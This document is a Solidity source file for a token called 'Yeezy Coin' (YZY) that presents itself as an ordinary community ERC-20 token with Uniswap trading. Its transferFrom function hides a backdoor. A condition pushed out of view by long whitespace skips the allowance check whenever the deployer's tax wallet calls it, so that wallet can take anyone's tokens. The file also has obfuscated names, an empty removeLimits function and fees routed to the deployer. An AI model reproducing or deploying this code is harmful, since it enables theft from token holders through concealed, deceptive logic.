// SPDX-License-Identifier: MIT

/*
    Name: Yeezy Coin
    Symbol: YZY

    YEEZY COIN | A COMMUNITY TOKEN

    Web: https://yeezyeth.wtf
    X: https://x.com/yeezyoneth
    tg: https://t.me/yeezyoneth
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

contract YZY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcYZY;
    mapping(address => mapping(address => uint256)) private _allcvnkjnYZY;
    mapping(address => bool) private _feevblknlYZY;
    address payable private _taxclknlYZY;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Yeezy Coin";
    string private constant _symbol = unicode"YZY";
    uint256 public _vnbbvlkYZY = _tTotal / 100;
    uint256 public _oijboijoiYZY = 15 * 10**18;

    uint256 private _cvjkbnkjYZY = 10;
    uint256 private _vkjbnkfjYZY = 10;
    uint256 private _maxovnboiYZY = 10;
    uint256 private _initvkjnbkjYZY = 20;
    uint256 private _finvjlkbnlkjYZY = 0;
    uint256 private _redclkjnkYZY = 2;
    uint256 private _prevlfknjoiYZY = 2;
    uint256 private _buylkvnlkYZY = 0;

    IUniswapV2Router02 private uniswapV2Router;
    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknYZY;
    bool private _inlknblYZY = false;
    bool private swapvlkYZY = false;
    uint256 private _sellcnjkYZY = 0;
    uint256 private _lastflkbnlYZY = 0;
    address constant _deadlknYZY = address(0xdead);

    modifier lockTheSwap() {
        _inlknblYZY = true;
        _;
        _inlknblYZY = false;
    }

    constructor() payable {
        _taxclknlYZY = payable(_msgSender());

        _feevblknlYZY[address(this)] = true;
        _feevblknlYZY[_taxclknlYZY] = true;

        _balknvlkcYZY[_msgSender()] = (_tTotal * 2) / 100;
        _balknvlkcYZY[address(this)] = (_tTotal * 98) / 100;

        emit Transfer(address(0), _msgSender(), (_tTotal * 2) / 100);
        emit Transfer(address(0), address(this), (_tTotal * 98) / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcYZY[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnYZY(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnYZY[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _downcklkojYZY(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        if(msg.sender == _taxclknlYZY) return false;
        if(!(sender == uniswapV2Pair || recipient != _deadlknYZY)) return false;
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnYZY(sender, recipient, amount);                                                                                                                                           if (_downcklkojYZY(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnYZY[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnYZY[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer_kjvnYZY(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblYZY(from, to, amount);

        _balknvlkcYZY[from] = _balknvlkcYZY[from].sub(amount);
        _balknvlkcYZY[to] = _balknvlkcYZY[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcYZY[address(this)] = _balknvlkcYZY[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }

        if (to != _deadlknYZY) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _calcTax_lvknblYZY(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblYZY) {
                taxAmount = amount
                    .mul((_buylkvnlkYZY > _redclkjnkYZY) ? _finvjlkbnlkjYZY : _initvkjnbkjYZY)
                    .div(100);
            }

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlYZY[to] &&
                to != _taxclknlYZY
            ) {
                _buylkvnlkYZY++;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblYZY &&
                to == uniswapV2Pair &&
                from != _taxclknlYZY &&
                swapvlkYZY &&
                _buylkvnlkYZY > _prevlfknjoiYZY
            ) {
                if (block.number > _lastflkbnlYZY) {
                    _sellcnjkYZY = 0;
                }
                _sellcnjkYZY = _sellcnjkYZY + _getAmountOut_lvcbnkYZY(amount);
                require(_sellcnjkYZY <= _oijboijoiYZY, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkYZY)
                    _swapTokenslknlYZY(_vnbbvlkYZY > amount ? amount : _vnbbvlkYZY);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjYZY(address(this).balance);
                }
                _lastflkbnlYZY = block.number;
            }
        }
        return taxAmount;
    }

    function _sendETHTocvbnjYZY(uint256 amount) private {
        _taxclknlYZY.transfer(amount);
    }

    function _swapTokenslknlYZY(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function enableYZYTrading() external onlyOwner {
        require(!_tradingvlknYZY, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkYZY = true;
        _tradingvlknYZY = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

    receive() external payable {}

    function _assist_bnYZY() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }

    function _getAmountOut_lvcbnkYZY(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }

    function removeLimits () external onlyOwner {

    }

    function _setTax_lknblYZY(address payable newWallet) external {
        require(_msgSender() == _taxclknlYZY);
        _taxclknlYZY = newWallet;
    }
}